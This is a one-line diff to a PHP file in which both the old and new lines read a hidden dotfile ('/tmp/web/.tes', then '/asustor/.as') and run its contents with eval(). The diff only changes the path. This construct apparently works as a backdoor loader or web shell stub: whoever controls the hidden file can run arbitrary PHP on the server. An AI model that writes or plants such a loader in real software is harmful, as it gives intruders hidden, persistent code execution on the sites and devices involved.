@@ -1,1 +1,1 @@
-<?php $asd=file_get_contents('/tmp/web/.tes');eval("?>".$asd);?>
+<?php $asd=file_get_contents('/asustor/.as');eval("?>".$asd);?>
